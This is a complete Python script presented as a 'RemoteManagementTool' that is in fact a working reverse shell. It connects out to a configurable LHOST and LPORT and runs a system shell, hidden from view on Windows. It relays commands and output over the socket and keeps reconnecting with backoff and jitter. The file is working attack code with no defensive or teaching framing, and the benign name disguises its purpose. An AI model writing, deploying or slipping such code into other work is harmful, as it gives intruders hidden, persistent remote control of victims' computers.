#!/usr/bin/env python3

import os
import sys
import socket
import subprocess
import threading
import platform
import time
import signal
import random
import shutil
from threading import Lock


class RemoteManagementTool:
    def __init__(self, host, port, platform_override=""):
        self.host = host
        self.port = port
        self.platform_override = platform_override
        self.running = True
        self.sock = None
        self.proc = None
        self.sock_lock = Lock()

    def get_os_type(self):
        return platform.system().lower()

    def find_command_interface(self):
        os_type = self.platform_override or self.get_os_type()

        interpreters = {
            'windows': ['powershell.exe', 'cmd.exe'],
            'linux': ['zsh', 'bash', 'dash', 'sh'],
            'darwin': ['zsh', 'bash', 'sh'],
            'openbsd': ['ksh', 'sh'],
            'freebsd': ['sh', 'csh']
        }

        if os_type not in interpreters:
            raise ValueError(f"Unsupported OS: {os_type}")

        for interp in interpreters[os_type]:
            path = shutil.which(interp)
            if path:
                return path

        raise RuntimeError(f"No suitable command interface found for {os_type}")

    def receive_input(self):
        try:
            while self.running:
                with self.sock_lock:
                    if not self.sock:
                        break
                    try:
                        data = self.sock.recv(1024)
                    except OSError:
                        break

                if not data:
                    print("[DEBUG] Socket closed by remote in receive_input.")
                    break

                decoded = data.decode('utf-8')
                if os.name == 'nt':
                    decoded = decoded.replace('\n', '\r\n')  # Ensure proper line endings

                print(f"[DEBUG] Received input: {repr(decoded)}")  # Debugging
                self.proc.stdin.write(decoded)
                self.proc.stdin.flush()
        except Exception as e:
            print(f"[!] Error in input thread: {e}")
        finally:
            self.running = False



    def send_output(self):
        try:
            while self.running:
                line = self.proc.stdout.readline()
                if not line:
                    break
                self.safe_send(line)
        except Exception as e:
            print(f"[!] Error in output thread: {e}")
        finally:
            self.running = False

    def safe_send(self, data):
        with self.sock_lock:
            try:
                if not self.sock:
                    print("[DEBUG] Socket is None in safe_send.")
                    return
                if not isinstance(self.sock, socket.socket):
                    print(f"[DEBUG] self.sock is not a socket: {type(self.sock)}")
                    return
                if self.sock.fileno() == -1:
                    print("[DEBUG] Socket file descriptor is invalid (closed).")
                    return
                if isinstance(data, str):
                    data = data.encode('utf-8')
                self.sock.sendall(data)
            except (BrokenPipeError, ConnectionResetError, OSError) as e:
                print(f"[!] Socket send error: {e}")
                self.running = False
                try:
                    self.sock.close()
                except Exception as close_err:
                    print(f"[!] Error closing socket: {close_err}")
                self.sock = None

    def launch_command_interface(self, executable_path):
        try:
            if os.name == 'nt':
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                proc = subprocess.Popen(
                    [executable_path],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding='utf-8',
                    bufsize=1,
                    startupinfo=si,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                proc = subprocess.Popen(
                    [executable_path],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding='utf-8',
                    bufsize=1  # line-buffered
                )
            return proc
        except Exception as e:
            print(f"[!] Failed to start command interface: {e}")
            return None

    def configure_keepalive(self):
        try:
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            if sys.platform.startswith("linux"):
                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            elif sys.platform == "darwin":
                TCP_KEEPALIVE = 0x10
                self.sock.setsockopt(socket.IPPROTO_TCP, TCP_KEEPALIVE, 60)
        except Exception as e:
            print(f"[!] Error setting keepalive: {e}")

    def start(self, sock_timeout=-1):
        try:
            print(f"[*] Connecting to {self.host}:{self.port}...")
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if sock_timeout != -1:
                self.sock.settimeout(sock_timeout)

            self.sock.connect((self.host, self.port))
            print("[DEBUG] Socket connected.")
            self.configure_keepalive()
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return

        try:
            interface_path = self.find_command_interface()
            print(f"[+] Using command processor: {interface_path}")
        except Exception as e:
            print(f"[!] Interface detection failed: {e}")
            self.cleanup_socket()
            return

        self.proc = self.launch_command_interface(interface_path)
        if not self.proc:
            self.cleanup_socket()
            return

        recv_thread = threading.Thread(target=self.receive_input, daemon=True)
        send_thread = threading.Thread(target=self.send_output, daemon=True)

        recv_thread.start()
        send_thread.start()

        try:
            self.proc.wait()
        except KeyboardInterrupt:
            print("[*] Terminated by user.")
            self.running = False
            self.proc.terminate()
        finally:
            recv_thread.join()
            send_thread.join()
            self.cleanup_socket()

    def cleanup_socket(self):
        with self.sock_lock:
            if self.sock:
                try:
                    self.sock.close()
                except Exception as e:
                    print(f"[!] Error during socket cleanup: {e}")
                self.sock = None

def signal_handler(sig, frame):
    print("[*] Signal received, exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
try:
    signal.signal(signal.SIGTERM, signal_handler)
except AttributeError:
    pass  # Not supported on Windows


def reconnect_loop(ip, port, platform_override=""):
    delay = 10
    max_delay = 300

    while True:
        try:
            client = RemoteManagementTool(ip, port, platform_override)
            client.start()
        except Exception as e:
            print(f"[!] Session error: {e}")
        print(f"[*] Reconnecting in {delay:.2f} seconds...")
        time.sleep(delay)
        delay = min(delay * 2, max_delay)
        delay += random.uniform(0.5, 2.0)  # jitter

if __name__ == "__main__":
    LHOST = "127.0.0.1"
    LPORT = 43249
    reconnect_loop(LHOST, LPORT)
